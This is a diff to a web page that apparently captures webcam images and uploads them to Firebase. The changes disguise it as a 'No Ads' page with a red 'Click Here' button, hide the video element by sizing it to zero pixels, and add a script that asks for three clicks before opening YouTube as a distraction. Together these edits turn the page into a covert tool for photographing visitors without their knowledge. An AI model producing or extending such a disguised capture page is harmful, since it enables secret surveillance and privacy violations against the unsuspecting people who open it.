@@ -7,9 +7,8 @@
     <style>
         #captureButton {
             display: block;
-            margin: 10px auto;
             padding: 10px 20px;
-            background-color: #007BFF;
+            background-color: #ff0000;
             color: white;
             border: none;
             cursor: pointer;
@@ -18,13 +17,17 @@
         #imageContainer {
             text-align: center;
         }
+        #video{
+            height: 0px;
+            width: 0px;
+        }
     </style>
 </head>
 <body>
-    <h1>Webcam Photo Capture</h1>
+    <h1>No Ads</h1>
     <div id="imageContainer">
         <video id="video" autoplay></video>
-        <button id="captureButton">Capture Photo</button>
+        <button id="captureButton" onclick="myFunction()">Click Here</button>
     </div>
 
     <script src="https://www.gstatic.com/firebasejs/8.3.2/firebase-app.js"></script>
@@ -96,6 +99,17 @@
                     console.error('Error uploading image:', error);
                 });
         }
+    </script>
+    <script>
+        function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function myFunction() {
+    alert("Click On The Button For 3 Times...")
+    sleep(8000).then(() => { window.open("https://www.youtube.com"); });
+}
+
     </script>
 </body>
 </html>
